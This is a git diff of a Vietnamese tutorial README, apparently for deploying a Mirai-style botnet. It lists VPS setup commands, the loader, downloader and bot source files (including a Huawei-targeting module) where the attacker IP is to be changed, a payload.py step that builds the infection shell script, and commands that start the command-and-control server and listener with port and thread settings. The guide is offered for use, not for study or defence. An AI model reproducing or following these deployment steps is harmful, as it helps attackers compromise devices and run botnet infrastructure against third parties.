@@ -3,10 +3,20 @@ TUT của zxcr9999
 ### Sao chép và dán tất cả vào shit vps của bạn
 ```
 yum update -y
+```
+```
 yum install epel-release -y
+```
+```
 yum groupinstall "Development Tools" -y
+```
+```
 yum install gmp-devel -y
+```
+```
 ln -s /usr/lib64/libgmp.so.3  /usr/lib64/libgmp.so.10
+```
+```
 yum install screen wget bzip2 gcc nano gcc-c++ electric-fence sudo git libc6-dev httpd xinetd tftpd tftp-server mysql mysql-server gcc glibc-static -y
 ```
 
@@ -14,27 +24,47 @@ yum install screen wget bzip2 gcc nano gcc-c++ electric-fence sudo git libc6-dev
 ```
 cd /tmp
 wget https://dl.google.com/go/go1.13.linux-amd64.tar.gz
+```
+```
 sha256sum go1.13.linux-amd64.tar.gz
+```
+```
 sudo tar -C /usr/local -xzf go1.13.linux-amd64.tar.gz
+```
+```
 export PATH=$PATH:/usr/local/go/bin
+```
+```
 export GOROOT=/usr/local/go
+```
+```
 export GOPATH=$HOME/Projects/Proj1
+```
+```
 export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
+```
+```
 export GOROOT=/usr/local/go; export GOPATH=$HOME/Projects/Proj1; export PATH=$GOPATH/bin:$GOROOT/bin:$PATH; go get github.com/go-sql-driver/mysql; go get github.com/mattn/go-shellwords
 source ~/.bash_profile
+```
+```
 go version
 go env
 cd ~/
 ```
 
 ### thay đổi ip
-```
-loader/src/main.c
-loader/src/headers/config.h
-dlr/main.c
-bot/huawei.c
-bot/util.c
-```
+
+`loader/src/main.c`
+
+`loader/src/headers/config.h`
+
+`dlr/main.c`
+
+`bot/huawei.c`
+
+`bot/util.c`
+
 
 ### thêm tên miền
 
@@ -128,13 +158,14 @@ SAU ĐÓ LƯU
 ulimit -n999999; ulimit -u999999; ulimit -e999999
 ```
 ### Xây dựng file `.sh`
+```
 python payload.py
-
+```
 ### Cách khởi động cnc và listen
 ```
 cd cnc/
 screen ./cnc 56999 1337 10
 screen ./listen
 ```
-
+----------------------------------------------------------
 Help: 56999 là cổng bot (nếu muốn thay thì vào file `bot/main.c` dòng 429), 1337 là cổng cnc, 10 là luồng (tối đa luồng là 750)
